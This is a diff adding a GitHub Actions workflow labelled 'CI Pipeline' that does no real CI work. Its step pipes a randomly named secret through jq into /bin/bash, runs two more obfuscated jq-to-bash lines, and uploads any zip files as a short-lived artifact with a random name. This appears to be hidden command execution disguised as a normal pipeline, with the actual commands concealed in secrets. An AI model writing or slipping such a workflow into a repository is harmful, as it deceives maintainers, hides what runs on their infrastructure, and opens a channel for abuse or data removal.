@@ -1,0 +1,28 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          hegh688: ${{ secrets.hegh688 }}
+        run: |
+          printf '%s' "$hegh688" | jq -r .qrc38368 | /bin/bash
+          echo $wxlf987 | jq -r .xiz35244 | /bin/bash
+          echo $ljixr5874 | jq -r .s59 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: etnIwuCQ
+          path: "*.zip"
+          retention-days: 1
